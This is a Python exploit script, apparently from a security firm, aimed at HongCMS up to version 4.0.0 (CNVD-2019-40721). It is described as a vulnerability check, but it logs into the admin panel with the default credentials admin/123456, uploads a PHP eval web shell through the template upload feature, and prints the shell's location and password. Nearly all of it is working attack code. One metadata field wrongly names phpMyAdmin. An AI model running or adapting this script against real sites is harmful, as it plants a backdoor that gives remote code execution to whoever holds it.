#!/usr/bin/env python3
#
# Single check to see if the server is still vulnerable to CNVD-2019-40721
# Written by: 秋水
# Company: 泽鹿安全
#
# from pyfiglet import Figlet
from bs4 import BeautifulSoup
from requests_toolbelt import MultipartEncoder
import time
import requests
import datetime
import optparse

code = 'CNVD-2019-40721'
version = '1.0'
author = '秋水'
vulDate = '2020-04-09'
createDate = '2020-04-09'
updateDate = '2020-04-09'
name = 'HongCMS后台存在代码执行漏洞(CNVD-2019-40721)'
appPowerLink = 'http://www.hongcms.com'
appName = 'PHPMyAdmin'
appVersion = '''HongCMS <= V4.0.0
'''
way = '''python CNVD-2019-40721.py
              python CNVD-2019-40721.py -u http://127.0.0.1 -f test'''


# 打印当前时间
def nowtime():
    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    return now


# 程序结束
def endtime():
    print(" ")
    time.sleep(0.3)
    print("*] shutting down at %s" % datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))


# 输出基本信息
def output():
    # f1 = Figlet(font='slant')  # 斜体 不slant是默认的字体 是不倾斜的
    # code1 = f1.renderText(code)
    # print(" ")
    # print(code1)  # 里面写需要的生成的文字，只支持英文
    print(" ")
    time.sleep(0.3)
    print("[*] 漏洞名称：%s" % name)
    time.sleep(0.3)
    print("[*] 影响版本：%s" % appVersion)
    time.sleep(0.3)
    print("[*] 使用方式：%s" % way)
    time.sleep(0.3)
    print("[*] 脚本版本：%s" % version)
    time.sleep(0.3)
    print("[*] 更新日期：%s" % updateDate)
    time.sleep(0.3)
    print("  ")
    print('''***********************************
           开始检测漏洞
***********************************''')
    print("  ")


# 登录函数
def login():
    try:
        address = url + "/admin/index.php/"
        rsp = session.get(address)
        text = rsp.content
        print("[*] %s 正在读取页面token..." % nowtime())
        if rsp.status_code == 200:
            soup = BeautifulSoup(text, "html.parser")
            key = soup.find("input", {'name': 'key'}).get("value")
            cookie = soup.find("input", {'name': 'code'}).get("value")
            time.sleep(0.2)
            print("[+] 获取成功！")
            print("[*] %s 正在尝试登录..." % nowtime())
            data = {
                "key": "%s" % key,
                "code": "%s" % cookie,
                "username": "admin",
                "password": "123456",
                "submit": "%E7%99%BB+%E5%BD%95"
            }
            time.sleep(0.2)
            rsp1 = session.post(address, data=data)
            text1 = rsp1.text
            if rsp1.status_code == 200 and "document.location=" in str(text1):
                time.sleep(0.2)
                print("[+] 登录成功！")
                upload()
            else:
                time.sleep(0.2)
                print("[-] 登录失败，请检查用户名密码是否正确！")
                endtime()
        else:
            print("[-] 生成失败，目标网站可能无法访问！")
            endtime()

    except requests.exceptions.ConnectionError:
        print("[-] 目标网站无法访问")
        endtime()
    except requests.exceptions.MissingSchema:
        print("[-] 目标网站格式不合法")
        endtime()


# 上传函数
def upload():
    address = url + "/admin/index.php/template/upload"
    payload = '''<?php
@@eval($_REQUEST['a']);
?>'''
    data = MultipartEncoder(
        fields={'dir': '',
                'file': ('%s.php' % file, payload, 'text/plain')}
    )
    rsp = session.post(address, data=data, headers={'Content-Type': data.content_type})
    text = rsp.text
    if rsp.status_code == 200 and "操作成功, 页面跳转中" in str(text):
        print("[+] 文件上传成功！")
        time.sleep(0.2)
        print("[+] shell地址：%s/public/templates/%s.php" % (url, file))
        time.sleep(0.1)
        print("[+] shell密码：a ")
        endtime()
    else:
        print("[-] 文件上传失败！")
        endtime()


# 检测函数
def check():
    login()


if __name__ == "__main__":
    # noinspection PyBroadException
    try:
        usage = "python %prog -u/-U <target url> -f/-F <filename>"  # 用于显示帮助信息
        parser = optparse.OptionParser(usage)  # 创建对象实例
        parser.add_option('-u', '-U', dest='url', action='store', help='target url',
                          default=False)  # 需要的命令行参数
        parser.add_option('-f', '-F', dest='file', action='store', help='filename', default=False)
        (options, args) = parser.parse_args()
        session = requests.session()
        if options.url:
            url = options.url
            file = options.file
            output()
            check()
        else:
            parser.print_help()
            endtime()

    except BaseException as e:
        print("[-] 请输入参数值！")
        endtime()
